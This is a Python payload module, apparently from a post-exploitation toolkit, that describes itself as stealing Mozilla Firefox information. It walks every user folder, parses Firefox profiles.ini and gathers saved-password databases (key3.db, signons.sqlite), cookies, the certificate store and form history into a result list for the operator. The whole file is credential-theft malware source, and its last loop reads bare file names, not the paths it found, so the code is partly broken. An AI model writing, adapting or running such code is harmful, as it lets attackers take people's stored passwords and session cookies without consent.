#REQUIRE_LINUX
#This payload steals Mozilla Firefox information
#TODO: Provide support for downloading
import re

result = []
files = []

files.append('bookmarks.html')
files.append('content-prefs.sqlite')
files.append('cookies.sqlite-journal')
files.append('downloads.sqlite')
files.append('permissions.sqlite')
files.append('key3.db')
files.append('signons.sqlite')
files.append('cert8.db')
files.append('formhistory.sqlite')

def parse_mozilla_dir_path (profile):
    path = re.findall('(?<=Path=)(.*)', profile, re.MULTILINE)
    if path:
        return path
    else:
        return ''

users_folders = run_payload('users_folders')
for users in users_folders:
    list = parse_mozilla_dir_path(read(users+'.mozilla/firefox/profiles.ini'))
    if list:
        for folder in list:
            for file in files:
                if read(users+'.mozilla/firefox/'+folder+'/'+file):
                    result.append(users+'.mozilla/firefox/'+folder+'/'+file)

for file in files:
    if read(file) != '':
        result.append('-------------------------')
        result.append('FILE => '+file)
        result.append(read(file))

result = [p for p in result if p != '']
